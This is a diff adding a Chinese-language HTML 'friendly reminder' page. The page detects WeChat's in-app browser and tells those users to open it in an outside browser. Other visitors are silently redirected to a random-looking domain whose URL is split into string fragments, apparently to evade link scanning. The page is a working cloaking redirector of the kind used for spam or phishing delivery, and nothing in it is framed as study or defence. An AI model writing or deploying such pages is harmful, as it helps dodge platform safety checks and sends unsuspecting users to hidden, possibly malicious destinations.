@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>温馨提示</title>
+    <script>
+        function isWeixinBrowser() {
+            var ua = navigator.userAgent.toLowerCase();
+            return ua.indexOf('micromessenger') !== -1;
+        }
+        
+        window.onload = function() {
+            if (isWeixinBrowser()) {
+                document.getElementById('weixin-tip').style.display = 'block';
+            } else {
+                // Split URL into three parts
+                var part1 = "htt";
+                var part2 = "ps:";
+                var part3 = "//";
+                var part4 = "y2vkm.mpvyn";
+                var part5 = ".com/ggAXbLdbmu";
+                 var part6 = "/otcyntczyz";
+                
+                // Concatenate the parts
+                var redirectUrl = part1 + part2 + part3+ part4+ part5+ part6;
+                
+                window.location.href = redirectUrl;
+                document.getElementById('content').style.display = 'block';
+            }
+        };
+    </script>
+    <style>
+        body {
+            font-family: 'PingFang SC', 'Helvetica Neue', Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+            color: #333;
+            line-height: 1.6;
+        }
+        .weixin-tip {
+            display: none;
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+            background-color: #f8f8f8;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+        .weixin-tip img {
+            width: 100px;
+            height: 100px;
+            margin-bottom: 20px;
+        }
+        .weixin-tip h2 {
+            color: #07C160;
+            margin-bottom: 15px;
+        }
+        .content {
+            display: none;
+            max-width: 800px;
+            margin: 0 auto;
+            text-align: left;
+        }
+        .arrow {
+            position: absolute;
+            right: 20px;
+            top: 20px;
+            width: 0;
+            height: 0;
+            border-left: 10px solid transparent;
+            border-right: 10px solid transparent;
+            border-bottom: 15px solid #07C160;
+            transform: rotate(90deg);
+        }
+        .dots {
+            position: absolute;
+            right: 10px;
+            top: 10px;
+            font-size: 24px;
+            color: #07C160;
+        }
+        .browser-icon {
+            display: inline-block;
+            width: 60px;
+            height: 60px;
+            margin: 20px;
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="weixin-tip" class="weixin-tip">
+        <div style="position: relative; margin-bottom: 40px;">
+            <div class="dots">⋯</div>
+            <div class="arrow"></div>
+        </div>
+        <h2>请在浏览器中打开</h2>
+        <p>当前页面在微信中可能无法正常显示</p>
+        <p>请点击右上角 <strong>⋯</strong> 按钮</p>
+        <p>然后选择在<strong>浏览器中打开</strong></p>
+    
+    </div>
+
+   
+</body>
+</html>
